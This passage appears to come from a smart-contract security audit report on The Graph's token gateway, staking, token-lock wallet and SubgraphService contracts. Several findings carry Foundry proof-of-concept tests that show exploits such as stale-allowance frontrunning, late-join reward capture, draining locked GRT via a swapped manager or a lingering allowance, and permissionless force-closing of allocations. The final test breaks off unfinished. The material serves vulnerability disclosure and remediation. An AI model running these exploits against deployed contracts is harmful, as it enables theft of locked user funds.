finalizeInboundTransfer() mints any escrow shortfall using _l2MintAmountAllowed(), which reads the current block against the live l2MintAllowancePerBlock. updateL2MintAllowance() is explicitly delayed because _updateBlockNum must be in the past, so after L2 issuance is reduced but before the L1 update transaction is mined, executable L2-to-L1 withdrawals still use the stale higher rate. A withdrawal executor or block builder can order a large finalizeInboundTransfer() before the pending update and mint the stale allowance surplus. After the governor update snapshots the lower allowance at the intended update block, totalMintedFromL2 can exceed accumulatedL2MintAllowanceAtBlock(block.number), causing later withdrawals that need minting to revert until manual intervention or future allowance catches up.

Vulnerable snippet:
function updateL2MintAllowance(uint256 _l2IssuancePerBlock, uint256 _updateBlockNum) external onlyGovernor {
    require(_updateBlockNum < block.number, "BLOCK_MUST_BE_PAST");
    accumulatedL2MintAllowanceSnapshot = accumulatedL2MintAllowanceAtBlock(_updateBlockNum);
    lastL2MintAllowanceUpdateBlock = _updateBlockNum;
    l2MintAllowancePerBlock = _l2IssuancePerBlock;
}

function _l2MintAmountAllowed(uint256 _amount) internal view returns (bool) {
    return (totalMintedFromL2.add(_amount) <= accumulatedL2MintAllowanceAtBlock(block.number));
}

## Impact
A permissionless L2 withdrawing user with an executable withdrawal can extract GRT minting capacity computed from a stale higher issuance rate, potentially minting more L1 GRT than the post-update allowance permits and leaving subsequent L2-to-L1 withdrawals permanently or temporarily reverted because totalMintedFromL2 is above the corrected allowance.

## Proof of Concept
1. L2 issuance is reduced at the L2 side, and governance prepares updateL2MintAllowance(newLowerRate, updateBlockNum) for the corresponding past L1 block.
2. An attacker has a large L2-to-L1 withdrawal message already executable on L1, or a block builder observes both the withdrawal execution and the governance update.
3. The attacker orders finalizeInboundTransfer() before updateL2MintAllowance() in the same block or immediately before it.
4. _mintFromL2() checks accumulatedL2MintAllowanceAtBlock(block.number) using the stale high l2MintAllowancePerBlock and succeeds.
5. Governance update then snapshots the allowance at updateBlockNum and installs the lower rate.
6. totalMintedFromL2 is now greater than the corrected allowance, so later withdrawals requiring minting revert with INVALID_L2_MINT_AMOUNT.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract L1GatewayMintAllowanceHarness {
    uint256 public totalMintedFromL2;
    uint256 public accumulatedL2MintAllowanceSnapshot;
    uint256 public lastL2MintAllowanceUpdateBlock;
    uint256 public l2MintAllowancePerBlock;

    function setInitial(uint256 rate, uint256 lastBlock, uint256 minted) external {
        l2MintAllowancePerBlock = rate;
        lastL2MintAllowanceUpdateBlock = lastBlock;
        totalMintedFromL2 = minted;
    }

    function accumulatedL2MintAllowanceAtBlock(uint256 blockNum) public view returns (uint256) {
        require(blockNum >= lastL2MintAllowanceUpdateBlock, "INVALID_BLOCK_FOR_MINT_ALLOWANCE");
        return accumulatedL2MintAllowanceSnapshot + l2MintAllowancePerBlock * (blockNum - lastL2MintAllowanceUpdateBlock);
    }

    function updateL2MintAllowance(uint256 newRate, uint256 updateBlockNum) external {
        require(updateBlockNum < block.number, "BLOCK_MUST_BE_PAST");
        require(updateBlockNum > lastL2MintAllowanceUpdateBlock, "BLOCK_MUST_BE_INCREMENTING");
        accumulatedL2MintAllowanceSnapshot = accumulatedL2MintAllowanceAtBlock(updateBlockNum);
        lastL2MintAllowanceUpdateBlock = updateBlockNum;
        l2MintAllowancePerBlock = newRate;
    }

    function finalizeInboundTransfer(uint256 amount, uint256 escrowBalance) external {
        if (amount > escrowBalance) {
            _mintFromL2(amount - escrowBalance);
        }
    }

    function _mintFromL2(uint256 amount) internal {
        require(totalMintedFromL2 + amount <= accumulatedL2MintAllowanceAtBlock(block.number), "INVALID_L2_MINT_AMOUNT");
        totalMintedFromL2 += amount;
    }
}

contract L1GraphTokenGatewayMintAllowanceRaceTest is Test {
    function testFrontrunStaleAllowanceBeforeDecrease() public {
        L1GatewayMintAllowanceHarness gateway = new L1GatewayMintAllowanceHarness();
        gateway.setInitial(100 ether, 0, 0);

        vm.roll(100);
        // L2 issuance is reduced to zero at the block corresponding to L1 block 100.
        // The governor update must use a past block, so it cannot be effective before a later L1 block.

        vm.roll(109);
        gateway.finalizeInboundTransfer(10900 ether, 0);
        assertEq(gateway.totalMintedFromL2(), 10900 ether);

        gateway.updateL2MintAllowance(0, 100);
        assertEq(gateway.accumulatedL2MintAllowanceAtBlock(block.number), 10000 ether);
        assertGt(gateway.totalMintedFromL2(), gateway.accumulatedL2MintAllowanceAtBlock(block.number));

        vm.expectRevert(bytes("INVALID_L2_MINT_AMOUNT"));
        gateway.finalizeInboundTransfer(1 ether, 0);
    }
}

## Suggested Mitigation
Add a two-phase or scheduled allowance update that becomes effective at the issuance-change block before user finalization can consume stale allowance. At minimum, allow governance to pre-commit pending allowance parameters, have _l2MintAmountAllowed() apply the pending lower rate for blocks at or after its effective block, and/or pause minting finalizations during issuance-rate transitions. Also enforce that updates cannot leave totalMintedFromL2 above the corrected allowance without an explicit bounded recovery path.


## [M-90]. Late delegators can join immediately before reward distribution and capture historical rewards

## id: NrfGQTmHOKIM9zqRbWg9m

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
L1Staking.delegate

## Finding Status: Valid
### Finding Status Justification: The in-scope code implements the described live-share reward accounting. In StakingExtension._delegate, a delegator receives shares immediately based on the current pool.tokens and pool.shares. Later, reward distribution in Staking adds delegationRewards directly to pool.tokens without tracking when each delegator entered. There is no per-user reward index, reward debt, minimum holding time, or allocation-period snapshot. Because a staked indexer can have pending collect() or closeAllocation() rewards, a large late delegator can enter before settlement and receive a pro-rata claim on rewards accrued earlier. No complete safeguard or documentation of accepted risk is present in the prompt.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are added to `pool.tokens` at distribution time and are shared by whoever owns pool shares at that moment. The system does not track `userRewardPerTokenPaid`, reward debt, minimum holding time, or a snapshot of pool shares for the allocation period. Vulnerable snippet: `shares = delegatedTokens.mul(pool.shares).div(pool.tokens); pool.tokens = pool.tokens.add(delegatedTokens); pool.shares = pool.shares.add(shares); ... pool.tokens = pool.tokens.add(delegationRewards);`. A large holder can delegate shortly before a known `collect()` or `closeAllocation()` reward distribution, receive shares at the pre-reward exchange rate, capture a pro-rata share of rewards earned before joining, then undelegate and withdraw after the normal unbonding period.

## Impact
Existing delegators are diluted out of historical rewards by short-term capital that did not participate during the reward accrual period. This can transfer GRT rewards from long-term delegators to late joiners.

## Proof of Concept
1. Existing delegators hold all shares while an allocation accrues rewards. 2. A large holder observes or anticipates a `closeAllocation()` or `collect()` transaction. 3. The holder calls `delegate()` immediately before settlement, minting shares against the pre-reward pool. 4. Settlement adds the historical reward amount to `pool.tokens`. 5. The late delegator's shares now redeem a pro-rata portion of rewards accrued before they joined.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract LateJoinHarness {
    uint32 constant MAX_PPM = 1_000_000;
    struct Delegation { uint256 shares; }
    struct Pool { uint32 indexingRewardCut; uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }
    Pool internal pool;
    function seedExisting(address user, uint256 tokens_, uint256 shares_) external { pool.tokens = tokens_; pool.shares = shares_; pool.indexingRewardCut = 0; pool.delegators[user].shares = shares_; }
    function delegate(address user, uint256 tokens_) external returns (uint256 shares) { shares = pool.tokens == 0 ? tokens_ : tokens_ * pool.shares / pool.tokens; pool.tokens += tokens_; pool.shares += shares; pool.delegators[user].shares += shares; }
    function distribute(uint256 rewards) external { uint256 indexerCut = uint256(pool.indexingRewardCut) * rewards / MAX_PPM; pool.tokens += rewards - indexerCut; }
    function claimable(address user) external view returns (uint256) { return pool.delegators[user].shares * pool.tokens / pool.shares; }
}

contract LateJoinerRewardTest is Test {
    function testLateJoinerCapturesHistoricalRewards() external {
        address longTerm = address(0xA11CE);
        address attacker = address(0xB0B);
        LateJoinHarness h = new LateJoinHarness();
        h.seedExisting(longTerm, 1_000 ether, 1_000 ether);
        h.delegate(attacker, 1_000 ether);
        h.distribute(1_000 ether);
        assertEq(h.claimable(attacker), 1_500 ether);
        assertGt(h.claimable(attacker), 1_000 ether);
        assertEq(h.claimable(longTerm), 1_500 ether);
    }
}

## Suggested Mitigation
Update rewards before any delegation share mint/burn, or track per-user reward debt/user index so new shares only earn rewards accrued after entry. For allocation-based rewards, snapshot eligible delegation shares at allocation creation or introduce an activation delay before new delegation shares participate in rewards.


## [M-91]. GraphTokenLock.release can count surplus as released managed tokens after revoke and break outstanding accounting

## id: sdJ9UQByrjzzpc_0uxVhw

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.releasableAmount/release/totalOutstandingAmount

## Finding Status: Valid
### Finding Status Justification: The accounting path exists. revoke() records revokedAmount as unvested managed tokens and transfers them to the owner. Later releasableAmount() computes availableAmount() - releasedAmount and caps only by currentBalance(), not by managedAmount - revokedAmount - releasedAmount. If the wallet holds surplus, release() can add surplus to releasedAmount, making releasedAmount + revokedAmount exceed managedAmount and causing totalOutstandingAmount() to underflow. No complete safeguard exists. Revocation is a normal lifecycle action and surplus support is documented, so this is a protocol accounting flaw, not merely user error or privileged abuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
`release()` increases `releasedAmount` by the amount returned from `releasableAmount()`, but `releasableAmount()` caps only by `currentBalance()` and `availableAmount() - releasedAmount`; it does not cap by `managedAmount - revokedAmount - releasedAmount`. Vulnerable snippet: `uint256 releasable = availableAmount().sub(releasedAmount); return MathUtils.min(currentBalance(), releasable);` and later `releasedAmount = releasedAmount.add(amountToRelease);`. After `revoke()` records unvested tokens in `revokedAmount`, surplus tokens held by the wallet can be released as if they were scheduled managed tokens. This can make `releasedAmount + revokedAmount > managedAmount`, causing `totalOutstandingAmount()` and `surplusAmount()` to underflow/revert.

## Impact
The wallet's core conservation invariant is broken. After a normal revocation plus surplus receipt, the beneficiary can put the wallet into a state where future surplus accounting reverts, causing later tokens sent to the wallet to become stuck behind an underflowing `totalOutstandingAmount()` path.

## Proof of Concept
1. A revocable wallet has `managedAmount = 100` and also holds `50` surplus tokens. 2. At a time when `50` tokens are vested, the owner calls `revoke()`, setting `revokedAmount = 50` and transferring the unvested `50` tokens to the owner. 3. The wallet still holds `100` tokens: `50` vested managed tokens plus `50` surplus tokens. 4. After `endTime`, `availableAmount()` returns `100`; `releasableAmount()` returns the full current balance of `100`. 5. Beneficiary calls `release()`, setting `releasedAmount = 100`. 6. Now `releasedAmount + revokedAmount = 150 > managedAmount`, and `totalOutstandingAmount()` reverts by SafeMath underflow.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
contract MockToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount,"bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(allowance[from][msg.sender]>=amount,"allow"); require(balanceOf[from]>=amount,"bal"); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract MockManager { function getTokenDestinations() external pure returns(address[] memory list){ list = new address[](0); } function getAuthFunctionCallTarget(bytes4) external pure returns(address){ return address(0); } }
contract RevokeSurplusAccountingPoC is Test { function testReleaseAfterRevokeCanBreakOutstandingAccounting() public { MockToken token = new MockToken(); MockManager manager = new MockManager(); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); address beneficiary = address(0xBEEF); wallet.initialize(address(manager), address(this), beneficiary, address(token), 100, 1000, 1100, 100, 0, 0, IGraphTokenLock.Revocability.Enabled); token.mint(address(wallet), 150); vm.warp(1050); wallet.revoke(); assertEq(wallet.revokedAmount(), 50); vm.warp(1101); vm.prank(beneficiary); wallet.release(); assertEq(wallet.releasedAmount(), 100); assertGt(wallet.releasedAmount() + wallet.revokedAmount(), wallet.managedAmount()); vm.expectRevert(); wallet.totalOutstandingAmount(); } }

## Suggested Mitigation
Cap releasable managed tokens by remaining managed obligations: `uint256 remainingManaged = managedAmount.sub(revokedAmount).sub(releasedAmount); uint256 scheduled = availableAmount().sub(releasedAmount); return MathUtils.min(currentBalance(), MathUtils.min(scheduled, remainingManaged));`. Keep surplus withdrawal separate from scheduled release accounting.


## [H-92]. Wallet owner can replace manager to approve a malicious token destination and drain locked GRT before vesting

## id: vv3Gaw6yuhQyR6NSIc3Z0

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
GraphTokenLockWallet.setManager

## Finding Status: Valid
### Finding Status Justification: GraphTokenLockWallet.setManager is onlyOwner but otherwise accepts any contract. approveProtocol is onlyBeneficiary and grants uint256.max allowance to every destination returned by that manager. For an L2-transferred wallet, initializeFromL1 sets releaseStartTime to endTime, so normal release can be blocked while the allowance path remains available. A colluding owner and beneficiary, or a single account holding both roles, can set a malicious manager, approve an attacker-controlled spender, and have it call transferFrom. No safeguard shown binds managers to an allowlist or ties approvals to the original manager.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
`GraphTokenLockWallet.setManager()` lets the per-wallet owner replace the manager with any contract address. `approveProtocol()` then trusts `manager.getTokenDestinations()` and grants each returned address unlimited token allowance from the wallet. Vulnerable snippets: `function setManager(address _newManager) external onlyOwner { _setManager(_newManager); }` and `token.approve(dstList[i], type(uint256).max);`. A wallet owner that is also the beneficiary, or colludes with the beneficiary, can point the wallet at an attacker-controlled manager whose destination list contains a drain contract, then approve and transfer out locked tokens without waiting for `releaseStartTime` or `endTime`.

## Impact
Locked GRT can be extracted through ERC20 allowance rather than the lock wallet's release schedule, bypassing the intended vesting/maturity gate. High-value L2-transferred token lock wallets can be emptied before maturity if the wallet owner and beneficiary are the same actor or cooperate.

## Proof of Concept
1. An L2 token lock wallet is initialized from L1 with `releaseStartTime = endTime` far in the future and funded with 1,000 GRT.
2. The wallet owner deploys an attacker-controlled manager whose `getTokenDestinations()` returns a drain contract.
3. The owner calls `setManager(attackerManager)` on the wallet.
4. The beneficiary calls `approveProtocol()`, granting the drain contract unlimited allowance.
5. The drain contract calls `transferFrom(wallet, attacker, 1,000 GRT)`, emptying the locked wallet while `releasableAmount()` is still zero.

## Proof of Code
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import 'forge-std/Test.sol';
import '../contracts/L2GraphTokenLockManager.sol';
import '../contracts/L2GraphTokenLockWallet.sol';
import '../contracts/GraphTokenLockManager.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

contract MockToken is IERC20 {
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function transfer(address to, uint256 amount) external override returns (bool) { require(balanceOf[msg.sender] >= amount); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { require(balanceOf[from] >= amount); require(allowance[from][msg.sender] >= amount); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

contract DrainDestination { function drain(IERC20 token, address from, address to, uint256 amount) external { require(token.transferFrom(from, to, amount)); } }

contract ManagerReplacementBypassPoC is Test {
    function testOwnerCanReplaceManagerAndDrainLockedFunds() public {
        MockToken token = new MockToken();
        address owner = address(0xABCD);
        address beneficiary = owner;
        address attacker = address(0xBEEF);
        L2GraphTokenLockWallet wallet = new L2GraphTokenLockWallet();
        L2GraphTokenLockWallet impl = new L2GraphTokenLockWallet();
        GraphTokenLockManager maliciousManager = new GraphTokenLockManager(IERC20(address(token)), address(impl));
        DrainDestination drain = new DrainDestination();
        maliciousManager.addTokenDestination(address(drain));
        vm.warp(1000);
        L2GraphTokenLockManager.TransferredWalletData memory data = L2GraphTokenLockManager.TransferredWalletData(address(0x1234), owner, beneficiary, 1000 ether, block.timestamp + 10 days, block.timestamp + 365 days);
        wallet.initializeFromL1(address(maliciousManager), address(token), data);
        token.mint(address(wallet), 1000 ether);
        assertEq(wallet.releasableAmount(), 0);
        vm.prank(owner);
        wallet.setManager(address(maliciousManager));
        vm.prank(beneficiary);
        wallet.approveProtocol();
        drain.drain(IERC20(address(token)), address(wallet), attacker, 1000 ether);
        assertEq(token.balanceOf(attacker), 1000 ether);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}

## Suggested Mitigation
Do not allow arbitrary per-wallet manager replacement for locked wallets, or restrict replacement to governance-approved managers from an immutable registry. Alternatively, remove `setManager()` for L2-transferred non-revocable wallets and make protocol destination approvals be checked against the original manager or an immutable allowlist.


## [H-93]. Removed token destinations keep unlimited wallet allowances because revokeProtocol only revokes current manager destinations

## id: dtq_DbgTj3v6jxNtmLscr

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
GraphTokenLockWallet / L2GraphTokenLockManager.revokeProtocol / removeTokenDestination

## Finding Status: Valid
### Finding Status Justification: The described functions and flow exist in production token-distribution code. approveProtocol approves every address returned by manager.getTokenDestinations() for uint256.max, while revokeProtocol later revokes only the current live list. GraphTokenLockManager.removeTokenDestination removes the address from that set, so the wallet has no built-in way to revoke that removed spender through revokeProtocol. No historical per-wallet approval set or explicit revoke-by-address safeguard is shown. The issue is not documented as an accepted risk. Although removal is performed by the manager owner, exploitation does not require malicious privileged abuse; a normal removal can leave a previously authorized spender with an outstanding allowance.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTokenLockWallet snapshots no per-wallet approval state. approveProtocol grants max allowance to every destination returned by the manager, but revokeProtocol later asks the manager for the live destination list again. If L2GraphTokenLockManager.removeTokenDestination removes a destination before a beneficiary revokes, the removed spender disappears from getTokenDestinations(), so revokeProtocol never zeros its existing allowance. Vulnerable snippets: GraphTokenLockWallet.approveProtocol(): `address[] memory dstList = manager.getTokenDestinations(); for (uint256 i = 0; i < dstList.length; i++) { token.approve(dstList[i], type(uint256).max); }`; GraphTokenLockWallet.revokeProtocol(): `address[] memory dstList = manager.getTokenDestinations(); for (uint256 i = 0; i < dstList.length; i++) { token.approve(dstList[i], 0); }`; GraphTokenLockManager.removeTokenDestination(): `_tokenDestinations.remove(_dst)`. The live global manager list is therefore used inconsistently across the approval and revocation phases.

## Impact
A deprecated, compromised, or otherwise removed protocol destination can retain max allowance on every wallet that approved it before removal and can pull wallet-held GRT through any available destination-side transferFrom path. For high-value lock wallets this can cause direct theft of locked user funds from protocol smart contracts.

## Proof of Concept
1. Manager owner adds a protocol token destination D. 2. A beneficiary calls approveProtocol(), granting D uint256.max allowance from the wallet. 3. Manager owner legitimately removes D, for example because it is deprecated or unsafe. 4. The beneficiary calls revokeProtocol(), but the removed D is no longer returned by getTokenDestinations(), so its allowance remains unchanged. 5. D or an actor able to trigger D's token-pull path calls transferFrom(wallet, attacker, amount) and drains wallet GRT despite being removed from the manager policy.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "../contracts/L2GraphTokenLockManager.sol";
import "../contracts/L2GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";

contract MockGRT is IERC20 {
    string public constant name = "Mock GRT";
    string public constant symbol = "GRT";
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { uint256 allowed = allowance[from][msg.sender]; require(allowed >= amount, "allowance"); if (allowed != uint256(-1)) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

contract RemovedDestinationPuller {
    function drain(IERC20 token, address from, address to, uint256 amount) external { require(token.transferFrom(from, to, amount), "pull failed"); }
}

contract StaleDestinationAllowanceTest is Test {
    function testRemovedDestinationKeepsAllowanceAndDrainsWallet() external {
        address beneficiary = address(0xBEEF);
        address attacker = address(0xA11CE);
        MockGRT token = new MockGRT();
        L2GraphTokenLockWallet master = new L2GraphTokenLockWallet();
        L2GraphTokenLockManager manager = new L2GraphTokenLockManager(IERC20(address(token)), address(master), address(0x1234), address(0x5678));
        L2GraphTokenLockWallet wallet = new L2GraphTokenLockWallet();
        wallet.initialize(address(manager), address(this), beneficiary, address(token), 1_000 ether, block.timestamp, block.timestamp + 365 days, 1, 0, 0, IGraphTokenLock.Revocability.Disabled);
        token.mint(address(wallet), 1_000 ether);
        RemovedDestinationPuller oldDestination = new RemovedDestinationPuller();
        manager.addTokenDestination(address(oldDestination));
        vm.prank(beneficiary);
        wallet.approveProtocol();
        assertEq(token.allowance(address(wallet), address(oldDestination)), uint256(-1));
        manager.removeTokenDestination(address(oldDestination));
        vm.prank(beneficiary);
        wallet.revokeProtocol();
        assertEq(token.allowance(address(wallet), address(oldDestination)), uint256(-1));
        oldDestination.drain(IERC20(address(token)), address(wallet), attacker, 1_000 ether);
        assertEq(token.balanceOf(attacker), 1_000 ether);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}

## Suggested Mitigation
Do not make revocation depend only on the live manager destination set. Track destinations approved by each wallet and revoke that wallet-local set, keep removed destinations in a retired/revocable list until allowances are cleared, or add a beneficiary/admin function that can revoke an explicit destination address regardless of whether it is currently allowed. Consider emitting removal guidance and avoiding max approvals where possible.


## [M-94]. Same-epoch allocations can be force-closed when maxPOIStaleness is zero or shorter than an epoch

## id: ABhhch6RW3Cehd24Jeacd

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
Dos

## Location
SubgraphService.closeStaleAllocation

## Finding Status: Valid
### Finding Status Justification: The force-close path exists. closeStaleAllocation() is external and permissionless, requiring only allocation.isStale(maxPOIStaleness) and non-altruistic status before calling _closeAllocation(..., true). Allocation.isStale() is purely timestamp based: block.timestamp - max(createdAt,lastPOIPresentedAt) > staleThreshold. maxPOIStaleness is stored uninitialized by initialize() and can be set by owner without a lower-bound check in _setMaxPoiStaleness(). _presentPoi() also evaluates STALE_POI before ALLOCATION_TOO_YOUNG. Thus with maxPOIStaleness equal to zero, or shorter than elapsed same-epoch time, a newly created non-altruistic allocation can be considered stale and force-closed before currentEpoch > createdAtEpoch. No maturity check blocks closeStaleAllocation. The affected code is in-scope production SubgraphService/AllocationManager code. Although the dangerous parameter can be set by owner, the prompt states zero is the initialized default unless configured, and the exploit call itself is permissionless, so this is not solely privileged abuse or future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
closeStaleAllocation only checks allocation.isStale(maxPOIStaleness) and does not enforce that the allocation has matured past its creation epoch. Allocation.isStale uses block.timestamp - max(createdAt,lastPOIPresentedAt) > staleThreshold, while initialize never sets maxPOIStaleness, leaving it at zero unless configured later. Vulnerable flow: function closeStaleAllocation(address allocationId) external whenNotPaused { IAllocation.State memory allocation = _allocations.get(allocationId); require(allocation.isStale(maxPOIStaleness), ...); require(!allocation.isAltruistic(), ...); _closeAllocation(allocationId, true); }. _presentPoi has the same ordering problem because it evaluates STALE_POI before ALLOCATION_TOO_YOUNG. If maxPOIStaleness is zero or less than elapsed time inside the creation epoch, a newly created non-altruistic allocation can be treated as stale before it is eligible to collect rewards.

## Impact
Any caller can prematurely close non-altruistic allocations during their creation epoch under a zero or too-short maxPOIStaleness configuration. This can interrupt indexing service, reclaim or drop uncollected rewards, and force indexers to recreate allocations, creating a permissionless liveness and reward-loss vector.

## Proof of Concept
1. maxPOIStaleness is zero after initialization, or is set shorter than the epoch duration. 2. An indexer creates a nonzero-token allocation at epoch N. 3. Before epoch N ends, block.timestamp advances past createdAt + maxPOIStaleness. 4. Any EOA calls closeStaleAllocation(allocationId). 5. The allocation is force-closed even though currentEpoch == createdAtEpoch and should have been treated as too young rather than stale.

## Proof of Code
pragma solidity ^0.8.23;
import 'forge-std/Test.sol';

contract StaleAllocationHarness {
    struct Allocation {
        address indexer;
        uint256 tokens;
        uint256 createdAt;
        uint256 closedAt;
        uint256 lastPOIPresentedAt;
        uint256 createdAtEpoch;
    }

    mapping(address => Allocation) public allocations;
    uint256 public currentEpoch = 7;
    uint256 public maxPOIStaleness;

    function create(address allocationId) external {
        allocations[allocationId] = Allocation(msg.sender, 1 ether, block.timestamp, 0, 0, currentEpoch);
    }

    function isStale(address allocationId) public view returns (bool) {
        Allocation memory a = allocations[allocationId];
        uint256 last = a.createdAt > a.lastPOIPresentedAt ? a.createdAt : a.lastPOIPresentedAt;
        return a.createdAt != 0 && a.closedAt == 0 && block.timestamp - last > maxPOIStaleness;
    }

    function closeStaleAllocation(address allocationId) external {
        require(isStale(allocationId), 'not stale');
        require(allocations[allocationId].tokens != 0, 'altruistic');
        allocations[allocationId].closedAt = block.timestamp;
    }

    function closedAt(address allocationId) external view returns (uint256) {
        return allocations[allocationId].closedAt;
    }

    function createdAtEpochOf(address allocationId) external view returns (uint256) {
        return allocations[allocationId].createdAtEpoch;
    }
}

contract SameEpochForceCloseTest is Test {
    function testPermissionlessCloseInCreationEpochWhenStalenessIsZero() public {
        StaleAllocationHarness svc = new StaleAllocationHarness();
        address indexer = address(0x1000);
        address attacker = address(0x2000);
        address allocationId = address(uint160(0xA11CE));

        vm.prank(indexer);
        svc.create(allocationId);
        assertEq(svc.createdAtEpochOf(allocationId), svc.currentEpoch());
        assertEq(svc.closedAt(allocationId), 0);

        vm.warp(block.timestamp + 1);
        vm.prank(attacker);
        svc.closeStaleAllocation(allocationId);

        assertEq(svc.createdAtEpochOf(allocationId), svc.currentEpoch());
        assertGt(svc.closedAt(allocationId), 0);
    }
}

## Suggested Mitigation
Initialize maxPOIStaleness to a nonzero value that is safely longer than the maximum time an allocation can remain in its creation epoch, and validate future updates with a lower bound. In closeStaleAllocation, also require currentEpoch > allocation.createdAtEpoch before allowing a force close. In _presentPoi, evaluate ALLOCATION_TOO_YOUNG before STALE_POI so same-epoch allocations defer instead of being reclaimed or closed as stale.


## [M-95]. Permissionless stale closure can terminate too-young SubgraphService allocations before first reward eligibility

## id: n3McbS5rJ865jkkMvndtV

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
Dos

## Location
SubgraphService.closeStaleAllocation

## Finding Status: Valid
### Finding Status Justification: The finding matches the supplied code. closeStaleAllocation() allows any caller to close an allocation once allocation.isStale(maxPOIStaleness) is true and the allocation is not altruistic; it does not check currentEpoch > allocation.createdAtEpoch. Allocation.isStale() uses only wall-clock elapsed time since createdAt or lastPOIPresentedAt. initialize() does not set maxPOIStaleness, and _setMaxPoiStaleness() has no lower bound. In _presentPoi(), stale status is also checked before the allocation-too-young condition. Therefore a same-epoch allocation can be treated as stale if maxPOIStaleness is zero or too short, and _closeAllocation() will reclaim/drop pending rewards and release accounting. This is in-scope production code, not documented as by design, and no complete safeguard is shown. The present default-zero condition means the issue exists now and is not merely hypothetical or dependent solely on privileged misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`closeStaleAllocation()` only checks wall-clock staleness and altruistic status before force-closing an allocation. It does not enforce the reward lifecycle gate that allocations in their creation epoch are `ALLOCATION_TOO_YOUNG` and should not be force-closed before first maturity eligibility. Vulnerable snippet: `function closeStaleAllocation(address allocationId) external override whenNotPaused { IAllocation.State memory allocation = _allocations.get(allocationId); require(allocation.isStale(maxPOIStaleness), SubgraphServiceCannotForceCloseAllocation(allocationId)); require(!allocation.isAltruistic(), SubgraphServiceAllocationIsAltruistic(allocationId)); _closeAllocation(allocationId, true); }`. `Allocation.isStale()` is purely `block.timestamp - max(createdAt,lastPOIPresentedAt) > maxPOIStaleness`, while `_presentPoi()` checks staleness before `currentEpoch <= allocation.createdAtEpoch`. If `maxPOIStaleness` is zero or shorter than elapsed time within the creation epoch, a non-altruistic allocation can be classified as stale and closed before it can ever become eligible for normal reward collection.

## Impact
Permissionless premature closure of live allocations, releasing provision accounting and removing the allocation from `_subgraphAllocatedTokens` before the indexer reaches first maturity. This can deny service continuity and cause pending reward paths to be reclaimed/dropped instead of deferred as too young.

## Proof of Concept
1. Owner configures `maxPOIStaleness` to zero or a value shorter than an epoch, which the setter currently permits. 2. Indexer opens a nonzero-token allocation in epoch N. 3. Before epoch N+1, after `block.timestamp - createdAt > maxPOIStaleness`, any EOA calls `closeStaleAllocation(allocationId)`. 4. The function treats the still-too-young allocation as stale and calls `_closeAllocation(allocationId, true)`. 5. The allocation is closed even though the allocation lifecycle should defer reward handling until it is mature.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract TooYoungAllocationForceClosePoC is SubgraphServiceTestBase {
    function testTooYoungAllocationCanBeForceClosedAsStale() public {
        address indexer = makeAddr("indexer");
        address attacker = makeAddr("attacker");

        vm.prank(owner);
        subgraphService.setMaxPOIStaleness(0);

